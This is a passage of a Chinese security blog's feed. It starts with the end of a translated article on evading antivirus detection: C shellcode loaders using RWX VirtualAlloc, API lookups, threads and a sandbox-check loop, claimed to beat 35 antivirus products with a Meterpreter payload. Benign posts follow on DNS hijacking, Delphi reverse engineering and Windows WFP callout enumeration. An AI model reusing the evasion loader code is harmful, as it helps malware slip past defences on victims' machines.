class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  (*(<span class="keyword">void</span>(*)())BUFFER)();	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><strong>LoadLibrary/GetProcAddress</strong>:<br><br>LoadLibrary和GetProcAddress win API函数组合允许我们使用所有其他win API函数，并且这种使用方式不会直接调用内存操作函数和恶意软件，因此可能不太吸引人注意。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HINSTANCE K32 = LoadLibrary(TEXT(<span class="string">"kernel32.dll"</span>));</span><br><span class="line">  <span class="keyword">if</span>(K32 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    MYPROC Allocate = (MYPROC)GetProcAddress(K32, <span class="string">"VirtualAlloc"</span>);</span><br><span class="line">    <span class="keyword">char</span>* BUFFER = (<span class="keyword">char</span>*)Allocate(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">    (*(<span class="keyword">void</span>(*)())BUFFER)();	</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><strong>GetModuleHandle/GetProcAddress</strong>:<br><br>该方法甚至不使用LoadLibrary函数，因为它利用了已加载的kernel32.dll的优势，GetModuleHandle函数从一个已加载的dll中检索模块句柄，这个方法大概是最隐蔽的执行方法。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle(<span class="string">"kernel32.dll"</span>), <span class="string">"VirtualAlloc"</span>);</span><br><span class="line">  <span class="keyword">char</span>* BUFFER = (<span class="keyword">char</span>*)Allocate(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  (*(<span class="keyword">void</span>(*)())BUFFER)();	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><strong>多线程执行</strong>:<br><br>对逆向工程工程师来说，逆向多线程PE文件总是比较困难，这对于反病毒软件也是一个挑战，多线程方法可以与上述所有执行方法一起使用，将函数指针指向shellcode并通过创建新线程执行shellcode将使情况变得复杂，通过这种方式可以同时执行shellcode和检测反病毒软件。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span>* BUFFER = (<span class="keyword">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,LPTHREAD_START_ROUTINE(BUFFER),<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">    BypassAV(argv);</span><br><span class="line">  &#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>上面的代码通过创建一个新线程来执行shellcode，在创建线程之后，有一个无限的whlie循环正在执行BypassAV函数，这种方法几乎可以使我们的BypassAV函数的效果翻倍，BypassAV将不断检查在运行Shellcode时使用沙箱和动态分析标志，这对于绕过某些等待执行Shellcode的高级启发式引擎也至关重要。<br><br>### 结论<br><br>最后其实关于如何编译恶意软件的方法很少，在编译源代码时，需要使用诸如堆栈保护程序之类的保护措施，并且剥离符号对于加强我们的恶意软件的逆向工程过程并减小文件大小至关重要。 ，建议使用Visual Studio进行编译，因为本文使用了内联汇编语法。<br>当所有这些方法结合在一起时，生成的恶意代码便能够绕过35种最先进的反病毒产品。<br><br><div align="center"><br><img src="/img/anti_av_av.png" align><br></div>

<h2 id="POC">POC</h2><p>使用本文中介绍的技术创建的Meterpreter显示了我们的恶意软件如何在真实系统中产生结果。<br>这些方法迟早也会过期，但是总会有更多的方法绕过反病毒软件。</p>
<h2 id="第二部分">第二部分</h2><p>反检测的艺术第二部分已经发表，通过以下链接可以查看：<a href="http://www.youngroe.com/art-of-anti-detection-2-pe-backdoor-manufacturing/">http://www.youngroe.com/art-of-anti-detection-2-pe-backdoor-manufacturing/</a></p>
<h2 id="参考">参考</h2><p>[1] – <a href="https://en.wikipedia.org/wiki/Antivirus_software" target="_blank" rel="external">https://en.wikipedia.org/wiki/Antivirus_software</a><br>[2] – <a href="https://en.wikipedia.org/wiki/Static_program_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Static_program_analysis</a><br>[3] – <a href="https://en.wikipedia.org/wiki/Dynamic_program_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Dynamic_program_analysis</a><br>[4] – <a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)" target="_blank" rel="external">https://en.wikipedia.org/wiki/Sandbox_(computer_security)</a><br>[5] – <a href="https://en.wikipedia.org/wiki/Heuristic_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Heuristic_analysis</a><br>[6] – <a href="https://en.wikipedia.org/wiki/Entropy" target="_blank" rel="external">https://en.wikipedia.org/wiki/Entropy</a><br>[7] – <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a><br>[8] –  <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx</a><br>The Antivirus Hacker’s Handbook<br>The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System<br><a href="http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf" target="_blank" rel="external">http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf</a><br><a href="http://pferrie.host22.com/papers/antidebug.pdf" target="_blank" rel="external">http://pferrie.host22.com/papers/antidebug.pdf</a><br><a href="https://www.symantec.com/connect/articles/windows-anti-debug-reference" target="_blank" rel="external">https://www.symantec.com/connect/articles/windows-anti-debug-reference</a><br><a href="https://www.exploit-db.com/docs/18849.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/18849.pdf</a><br><a href="http://blog.sevagas.com/?Fun-combining-anti-debugging-and" target="_blank" rel="external">http://blog.sevagas.com/?Fun-combining-anti-debugging-and</a></p>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本篇文章将介绍对抗最新反病毒软件静态检测、动态检测及启发式分析最有效的方法。其中一些已经是公开并被大众所熟知的方法，但是仍然有一些方法和绕过技巧是实现完全不可被检测（FUD,Fully Undetectable）恶意代码的关键，同时恶意代码的大小与其反检测能力同等重要，因此在实现这些反检测方法的时候我会努力让恶意代码的文件大小尽可能的小。本文也将介绍反病毒软件及Windows操作系统的内部原理，因此读者最好具备一定的C/C++及汇编语言基础同时对PE文件结构有一定的了解<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[记录一次被DNS劫持及解决方案(非改hosts方式)]]></title>
    <link href="http://www.youngroe.com/2020/08/02/Life/dns_hijacking/"/>
    <id>http://www.youngroe.com/2020/08/02/Life/dns_hijacking/</id>
    <published>2020-08-02T04:45:15.000Z</published>
    <updated>2020-08-07T16:15:52.418Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_现象">0x00 现象</h2><p>现象是访问Github Pages服务浏览器打不开，域名都是*.github.io类似的，即使走代理也不行，Chrome报错NET::ERR_CERT_AUTHORITY_INVALID，查看https证书居然是Vmware的</p>
<div align="center"><br><img src="/img/20200802_dns_vmware.png" align="https证书错误，为Vmware"><br></div>

<a id="more"></a>
<p>猜测是不是电脑系统出现问题了，但是手机连接上电脑宽带的wifi也连接不上，但是用4G网络可以，问题应该与系统无关，是运营商宽带的问题了。但是还是不知道具体那个环节出问题了，搜到一篇blog现象基本相同 <a href="https://www.wanvi.net/10200.html" target="_blank" rel="external">记录一个奇怪的问题 访问网页，证书错误是VMware</a>，但是文章中没有提解决方案，不过通过文章描述的现象及本地Wireshark抓包分析，是遇到dns劫持了，劫持方式是直接修改dns返回包。<br>只要是github.io下的域名全部被解析到了127.0.0.1，导致访问本地网络，同时正好装了Vmware的虚拟机，Vmware在本地会监听443端口，这样访问github.io相关域名会访问到本地Vmware开的端口上，并且Vmware的证书没有经过CA认证，Chrome会首先报证书错误，同时Vmware在443端口可能也没有提供http服务，即使忽略证书错误，网页也打不开。<br>尝试换DNS服务器，能正常几秒钟马上又被解析到127.0.0.1了，太丧心病狂了。</p>
<div align="center"><br><img src="/img/20200808_dns_nslookup.png" align="修改DNS服务器也不行"><br></div><br><div align="center"><br><img src="/img/20200802_dns_wireshark.png" align="Wireshark抓包发现，DNS返回包被修改"><br></div>

<h2 id="0x01_解决方案">0x01 解决方案</h2><p>在文章<a href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a>中提到过通过HTTPS协议查询DNS的方式，正好可以解决这个问题，步骤如下：</p>
<ul>
<li>下载<a href="https://developers.cloudflare.com/argo-tunnel/downloads#windows" target="_blank" rel="external">cloudflare的https dns客户端</a>，直接运行cloudflared.exe</li>
<li>修改电脑的dns服务器地址为127.0.0.1<br>这样设置后就不会被劫持了，可以正常访问github.io下的域名了，具体原理参考<a href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a></li>
</ul>
<p>另外如果cloudflare的doh服务器地址（1.1.1.1）被ban也可以使用<a href="https://github.com/bitbeans/SimpleDnsCrypt/" target="_blank" rel="external">SimpleDnsCrypt</a>原理相同。当然也可以使用带有DOH功能得浏览器，如firefox，不过仅对浏览器本身有效，非全局，其他程序还是存在被DNS劫持风险。<br>希望对遇到这个问题的人有用。</p>
<h2 id="0x02_参考文章">0x02 参考文章</h2><ul>
<li><a href="https://www.wanvi.net/10200.html" target="_blank" rel="external">记录一个奇怪的问题 访问网页，证书错误是VMware</a></li>
<li><a href="https://developers.cloudflare.com/argo-tunnel/downloads#windows" target="_blank" rel="external">cloudflare的https dns客户端</a></li>
<li><a href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_现象">0x00 现象</h2><p>现象是访问Github Pages服务浏览器打不开，域名都是*.github.io类似的，即使走代理也不行，Chrome报错NET::ERR_CERT_AUTHORITY_INVALID，查看https证书居然是Vmware的</p>
<div align="center"><br><img src="/img/20200802_dns_vmware.png" align="https证书错误，为Vmware"/><br></div>]]>
    
    </summary>
    
      <category term="DNS劫持" scheme="http://www.youngroe.com/tags/DNS%E5%8A%AB%E6%8C%81/"/>
    
      <category term="Life" scheme="http://www.youngroe.com/categories/Life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Delphi程序逆向反汇编技巧小记]]></title>
    <link href="http://www.youngroe.com/2019/07/01/Windows/delphi_reverse_summary/"/>
    <id>http://www.youngroe.com/2019/07/01/Windows/delphi_reverse_summary/</id>
    <published>2019-07-01T12:13:53.000Z</published>
    <updated>2020-02-23T12:38:10.293Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_Delphi语言基础">0x00 Delphi语言基础</h2><h3 id="1-Delphi语言概述">1.Delphi语言概述</h3><p>Delphi本身并非一种独立的语言，而是一种软件开发工具，是Object Pascal语言的一种开发工具。本身是大名鼎鼎的Borland公司开发的一种开发环境，包含IDE、图形界面库Visual Component Library(VCL)及数据库相关功能。其图像界面库VCL类似MFC，使用PME（Property/Method/Event）的开发模式。<br><a id="more"></a><br>VCL采用特有的RCDATA资源格式，RCDATA中包含有Delphi窗口（Forms）信息，当程序运行时通过初始化代码建立窗口，从RCDATA中获取所需要的信息。RCDATA信息可以通过PE Explorer等PE编辑器查看。</p>
<div align="center"><br><img src="/img/Delphi RCDATA.jpg" alt="Delphi窗口Form信息" align="center"><br></div><br>Delphi版本较多，不同版本有一些差异，目前已经发布的版本包括1-7, 2005, 2006, 2007, 2009, 2010, XE-XE8、10、10.1、10.2、10.3。Delphi的API查询可以通过参考链接2进行查询。<br><br>### 2.Delphi二进制特点<br><br>可以通过exeinfo/Detect It Easy等工具判断PE文件是否为Delphi开发及确定具体的Delphi版本信息，确定具体的版本信息有助于后续反汇编工具的设置，使工具反汇编出可读性更高的汇编代码。<br>Delphi常用的字符串的内存布局不同于C/C++的char*或则string对象，Delphi使用的字符串都是Pascal的字符串，在原始字符串前面存放的是字符串的长度<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint32_t len;</span><br><span class="line"><span class="keyword">char</span>    <span class="keyword">str</span>[];</span><br></pre></td></tr></table></figure><br><br><div align="center"><br><img src="/img/Delphi Str.jpg" alt="Delphi字符串内存布局" align="center"><br></div>

<p>Delphi遵循_fastcall调用约定，但是与Windows的_fastcall略有不同，参数顺序为eax为第一个参数、edx为第二个参数、ecx为第三个参数，大于3个的参数通过堆栈传递，大于三个的堆栈顺序从左到右依次压栈，堆栈由被调用者恢复。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line"><span class="number">00451F</span>91   <span class="number">6</span>A04                   push    $<span class="number">04</span></span><br><span class="line"><span class="number">00451F</span>93   <span class="number">6</span>A05                   push    $<span class="number">05</span></span><br><span class="line"><span class="number">00451F</span>95   B903000000             mov     ecx, $<span class="number">00000003</span></span><br><span class="line"><span class="number">00451F</span>9A   BA02000000             mov     edx, $<span class="number">00000002</span></span><br><span class="line"><span class="number">00451F</span>9F   B801000000             mov     eax, $<span class="number">00000001</span></span><br><span class="line"><span class="number">00451F</span>A4   E8C7FFFFFF             call    <span class="number">00451F</span>70</span><br></pre></td></tr></table></figure></p>
<p>Delphi的按钮事件地址是通过按钮名字和地址绑定的，具体为一个按钮名称对应一个按钮事件响应函数地址。而按钮名称可以在Delphi的RCDATA资源中找到，具体为通过PE Explorer打开资源RC数据，找到相应界面的Form，找到按钮名称的字符串值。</p>
<div align="center"><br><img src="/img/Delphi Button.jpg" alt="Delphi Form中的按钮信息" align="center"><br></div><br>这里为”Button1Click”，然后再IDA或则16进制编辑器中搜索该字符串，应该可以找到两个Button1Click字符串。其中一个是资源本身，另一个是事件地址和事件响应函数地址表，其中上面是地址下面是名称，Button1Click的地址表如下：<br><div align="center"><br><img src="/img/Delphi Button Func.jpg" alt="Delphi Form中的按钮信息" align="center"><br></div>

<h2 id="0x01_反汇编Delphi如何设置IDA_pro">0x01 反汇编Delphi如何设置IDA pro</h2><p>在使用ida进行反汇编时，大多数情况我们都会使用ida默认设置进行的反编译，在具体到某个函数时会对反汇编的字符串、语言、函数调用约定等进行一些小的调整。对一般程序这种设置反汇编效果都还不错，但是对Delphi程序这样反汇编出来的代码可读性很差，具体表现是函数的调用约定可能识别错误，字符串信息也不能自动识别。这时我们可以通过手动设置ida的反汇编选项对反汇编效果进行调节，具体如下：</p>
<ul>
<li>Load a new file,取消勾选的Analysis下的两个自动分析选项</li>
<li>Options–&gt;Compiler:Compiler（Delphi）、Calling convention(FastCall)</li>
<li>Options–&gt;General–&gt;String:Default string literal type(Pascal/Pascal16)</li>
<li>View–&gt;View–&gt;Open Subviews–&gt;Type libraries, remove the defaults</li>
<li>View–&gt;Open Subviews–&gt;Signatures–&gt;Apply new Signatures:选择delphi相关Signatures</li>
<li>Edit–&gt;Select all,在IDA View区域右键Analyze selected area</li>
</ul>
<p>经过这样一番设置后，IDA反汇编出来的效果比默认设置会好很多，但是IDA毕竟是一个通用反汇编工具，对Delphi程序的效果只能说差强人意，对delphi的一些库函数识别有限，并且对RCDATA的资源也未做特定解析，但是好在有另外一个神器，能大大优化IDA的不足，它就是IDR。</p>
<h2 id="0x02_Delphi反汇编大杀器IDR">0x02 Delphi反汇编大杀器IDR</h2><p><div align="center"><br><img src="/img/Delphi IDR.jpg" alt="IDR窗口" align="center"><br></div><br>IDR全称为Interactive Delphi Reconstructor，从名字上我们就可以知道这是一款专门针对Delphi的反汇编工具，工具下载地址可以参考参考链接3、4，主要模块包括:</p>
<ul>
<li>Idr.exe，IDR主功能模块</li>
<li>dis.dll 反汇编模块</li>
<li>*.bin  类似IDA的sig文件，用于识别Delphi的库函数</li>
</ul>
<p>IDR相对于IDA的优势如下：</p>
<ul>
<li>得益于多个版本的符号bin文件，IDR能够识别大部分Delphi库函数，比IDA的识别率高很多</li>
<li>默认设置直接解析delphi程序的字符串信息，在IDR Strings可以查看和搜索这些字符串</li>
<li>可视化查看delphi的RCDATA信息Form界面信息，并且能够直接获得按钮等元素的响应函数地址</li>
<li>ClassViewer窗口可直接查看部分类及函数名称，猜测这部分函数为RCDATA中声明的函数或则类似C++的RTTI信息</li>
</ul>
<p>虽然IDR针对Delphi程序的反汇编有这么多优势，但是相对于IDA还是缺少一些反汇编的高级功能，如图形化展示反汇编函数图、F5功能等。但好在IDR提供了导出功能，可以导出map、idc文件供IDA使用，这样就可以结合两个工具的优势分析Delphi程序，这样简直得心应手啊。</p>
<h2 id="0x03_简单总结">0x03 简单总结</h2><p>当分析一种新的语言或则类库开发的程序的时候，还是可以通过搜索或则询问学习一些该语言的基础知识，如字符串内存布局、默认调用约定等，这样在逆向分析时候可以大大增加我们的效率，减少体力活。<br>同时在学习到一些基础知识后，我们也能更好的使用所用的工具，不要迷信自动分析，必要时通过手动设置一些选项也能大大增加我们逆向分析的效率。</p>
<h2 id="0x04_参考链接">0x04 参考链接</h2><p><a href="https://zh.wikipedia.org/wiki/Delphi" target="_blank" rel="external">1.Delphi维基百科</a><br><a href="http://docwiki.embarcadero.com/Libraries/Tokyo/en/Main_Page" target="_blank" rel="external">2.Delphi语言的MSDN</a><br><a href="https://github.com/crypto2011/IDR" target="_blank" rel="external">3.IDR github</a><br><a href="https://www.52pojie.cn/thread-367796-1-1.html" target="_blank" rel="external">4.IDR下载地址</a><br><a href="https://forum.exetools.com/showthread.php?p=117450&amp;nojs=1" target="_blank" rel="external">5.Reverse engineering Delphi executables?</a><br><a href="https://reverseengineering.stackexchange.com/questions/2873/which-ida-pro-signature-should-be-used-for-borland-delphi-6-0-7-0-binaries-as-re" target="_blank" rel="external">6.which-ida-pro-signature-should-be-used-for-borland-delphi-6-0-7-0-binaries-as-re</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_Delphi语言基础">0x00 Delphi语言基础</h2><h3 id="1-Delphi语言概述">1.Delphi语言概述</h3><p>Delphi本身并非一种独立的语言，而是一种软件开发工具，是Object Pascal语言的一种开发工具。本身是大名鼎鼎的Borland公司开发的一种开发环境，包含IDE、图形界面库Visual Component Library(VCL)及数据库相关功能。其图像界面库VCL类似MFC，使用PME（Property/Method/Event）的开发模式。<br>]]>
    
    </summary>
    
      <category term="Delphi" scheme="http://www.youngroe.com/tags/Delphi/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows内核重拾：如何枚举系统中Windows Filtering Platform (WFP)驱动中的callout函数]]></title>
    <link href="http://www.youngroe.com/2019/06/25/Kernel/kernel_enum_wfp_callout_function/"/>
    <id>http://www.youngroe.com/2019/06/25/Kernel/kernel_enum_wfp_callout_function/</id>
    <published>2019-06-25T04:45:15.000Z</published>
    <updated>2020-02-15T07:54:24.201Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>WFP是Windows提供的一套新的网络数据包过滤框架，用于取代之前的TDI过滤框架，为用户态和内核态都提供API支持，可以很方便的实现网络数据包拦截/编辑，常用于实现防火墙、网速控制及入侵检测等。<br><a id="more"></a></p>
<p><div align="center"><br><img src="/img/wfp_arch.jpg" alt="WFP框架" align="center"><br></div><br>WFP架构如上图所示，虽然提供了用户态和内核态的接口，但是干事情部分都在内核层，关于WFP驱动的开发可以看下参考链接1。<br>在内核态最主要干活的，是通过FwpsCalloutRegister注册的三个回调函数，注册成功后会返回一个callout_id用于标识被注册的wfp callout对象。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> FWPS_<span class="built_in">CALLOUT1_</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// Uniquely identifies the callout. This must be the same GUID supplied to</span></span><br><span class="line">   <span class="comment">// FwpmCalloutAdd0.</span></span><br><span class="line">   G<span class="built_in">UID</span> calloutKey;</span><br><span class="line">   <span class="comment">// Flags</span></span><br><span class="line">   <span class="built_in">UINT32</span> flags;</span><br><span class="line">   <span class="comment">// Pointer to the classification function.</span></span><br><span class="line">   FWPS_<span class="built_in">CALLOUT_CLASSIFY_FN1</span> classifyFn;</span><br><span class="line">   <span class="comment">// Pointer to the notification function.</span></span><br><span class="line">   FWPS_<span class="built_in">CALLOUT_NOTIFY_FN1</span> notifyFn;</span><br><span class="line">   <span class="comment">// Pointer to the flow delete function.</span></span><br><span class="line">   FWPS_<span class="built_in">CALLOUT_FLOW_DELETE_NOTIFY_FN0</span> flowDeleteFn;</span><br><span class="line">&#125; FWPS_<span class="built_in">CALLOUT1</span>;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>classifyFn：主要干活的回调，可以获得网络包全部信息(与注册类型相关)，可以实现网络包数据拦截、编辑等。</li>
<li>notifyFn：当过滤器被添加到过滤引擎时被调用。</li>
<li>flowDeleteFn：当一个网络数据被终止时调用，这个函数中可以对classifyfn中的操作进行清理。<br>那如何枚举出这三个函数呢，如何实现类似Pchunter中枚举系统回调的功能呢，关联出时哪一个驱动注册的wfp网络过滤函数？</li>
</ul>
<h2 id="0x01_分析">0x01 分析</h2><p>最好的方式是找找有没用类似功能的软件，或则前人相关的分析。无奈只能找到一个参考链接2中的msdn中的一个帖子，用户态提供FwpmCalloutEnum这个api可以枚举出系统中wfp信息，只有callout_id，没有注册这个callout的模块和callout function信息。<br>倒是有工具实现了这个功能，<a href="https://github.com/AxtMueller/Windows-Kernel-Explorer" target="_blank" rel="external">Windows-Kernel-Explorer</a>实现了，但是模块加了VMP，不是很好分析。那就正面入手分析callout function如何注册到系统的了。<br>好在函数逻辑很简单，函数调用链大概如下:fwpkclnt.sys!FwpsCalloutRegister1—–&gt;netio!KfdAddCalloutEntry——&gt;netio!FeAddCalloutEntry，核心代码在函数FeAddCalloutEntry中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000026</span>CA6 <span class="number">48</span> <span class="number">8</span>B <span class="number">05</span> F3 <span class="number">79</span> <span class="number">03</span> <span class="number">00</span>                    mov     rax, cs:gWfpGlobal</span><br><span class="line">.text:<span class="number">0000000000026</span>CAD <span class="number">8</span>B <span class="number">5</span>C <span class="number">24</span> <span class="number">68</span>                             mov     ebx, [rsp+<span class="number">38</span>h+call_out_id_a6]</span><br><span class="line">.text:<span class="number">0000000000026</span>CB1 <span class="number">48</span> C1 E3 <span class="number">06</span>                             shl     rbx, <span class="number">6</span></span><br><span class="line">.text:<span class="number">0000000000026</span>CB5 <span class="number">48</span> <span class="number">03</span> <span class="number">98</span> <span class="number">50</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>                    add     rbx, [rax+<span class="number">550</span>h]</span><br><span class="line">.text:<span class="number">0000000000026</span>CBC <span class="number">48</span> <span class="number">8</span>B CB                                mov     rcx, rbx</span><br><span class="line">.text:<span class="number">0000000000026</span>CBF E8 <span class="number">6</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          call    IsCalloutEntryAvailable</span><br><span class="line">.text:<span class="number">0000000000026</span>CC4 <span class="number">48</span> <span class="number">8</span>B F8                                mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CC7 <span class="number">48</span> <span class="number">85</span> C0                                test    rax, rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CCA <span class="number">0F</span> <span class="number">85</span> <span class="number">10</span> <span class="number">8</span>C FF FF                       jnz     loc_1F8E0</span><br><span class="line">.text:<span class="number">0000000000026</span>CD0 <span class="number">48</span> <span class="number">89</span> <span class="number">03</span>                                mov     [rbx], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CD3 <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">08</span>                             mov     [rbx+<span class="number">8</span>], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CD7 <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">28</span>                             mov     [rbx+<span class="number">28</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CDB <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">30</span>                             mov     [rbx+<span class="number">30</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CDF <span class="number">48</span> <span class="number">89</span> <span class="number">43</span> <span class="number">38</span>                             mov     [rbx+<span class="number">38</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000026</span>CE3 <span class="number">8</span>B <span class="number">44</span> <span class="number">24</span> <span class="number">60</span>                             mov     eax, dword ptr [rsp+<span class="number">38</span>h+arg_20]</span><br><span class="line">.text:<span class="number">0000000000026</span>CE7 <span class="number">48</span> <span class="number">89</span> <span class="number">73</span> <span class="number">20</span>                             mov     [rbx+<span class="number">20</span>h], rsi</span><br><span class="line">.text:<span class="number">0000000000026</span>CEB <span class="number">48</span> <span class="number">8</span>B <span class="number">74</span> <span class="number">24</span> <span class="number">70</span>                          mov     rsi, [rsp+<span class="number">38</span>h+device_object]</span><br><span class="line">.text:<span class="number">0000000000026</span>CF0 <span class="number">44</span> <span class="number">89</span> <span class="number">2</span>B                                mov     [rbx], r13d</span><br><span class="line">.text:<span class="number">0000000000026</span>CF3 C7 <span class="number">43</span> <span class="number">04</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                    mov     dword ptr [rbx+<span class="number">4</span>], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000026</span>CFA <span class="number">4</span>C <span class="number">89</span> <span class="number">63</span> <span class="number">10</span>                             mov     [rbx+<span class="number">10</span>h], r12</span><br><span class="line">.text:<span class="number">0000000000026</span>CFE <span class="number">48</span> <span class="number">89</span> <span class="number">6</span>B <span class="number">18</span>                             mov     [rbx+<span class="number">18</span>h], rbp</span><br><span class="line">.text:<span class="number">0000000000026</span>D02 <span class="number">89</span> <span class="number">43</span> <span class="number">28</span>                                mov     [rbx+<span class="number">28</span>h], eax</span><br><span class="line">.text:<span class="number">0000000000026</span>D05 <span class="number">48</span> <span class="number">85</span> F6                                test    rsi, 